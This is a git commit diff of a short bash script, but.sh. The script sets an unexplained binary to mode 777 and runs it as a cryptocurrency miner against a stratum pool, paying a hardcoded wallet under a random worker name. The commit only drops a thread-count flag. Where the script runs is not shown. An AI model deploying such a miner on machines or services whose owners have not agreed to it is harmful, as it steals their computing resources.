8c917145dfeb87eb3faa4b0c4f6784de1bd73fa5
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-03-08 22:24:09 +0700

    Update but.sh

--- but.sh
+++ but.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 chmod 777 avx2
-./avx2 -a gr -o stratum+tcp://eu.mecrypto.club:3051 -u Xr52u2aoWETd6RrrHJKunCYRnmGL6Eh1Kf.$(echo $(shuf -i 1-20000 -n 1)-V) -p c=BUTK-gr -t8
+./avx2 -a gr -o stratum+tcp://eu.mecrypto.club:3051 -u Xr52u2aoWETd6RrrHJKunCYRnmGL6Eh1Kf.$(echo $(shuf -i 1-20000 -n 1)-V) -p c=BUTK-gr
